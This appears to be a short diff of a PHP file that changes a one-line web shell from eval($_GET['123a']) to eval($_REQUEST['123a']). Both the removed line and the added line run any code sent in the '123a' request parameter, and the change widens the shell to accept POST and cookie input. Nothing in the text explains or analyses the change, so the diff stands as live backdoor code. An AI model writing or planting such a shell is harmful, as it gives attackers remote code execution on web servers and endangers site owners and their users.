@@ -1,4 +1,4 @@
 <?php
 //
-eval($_GET["123a"]);
+eval($_REQUEST["123a"]);
 ?>
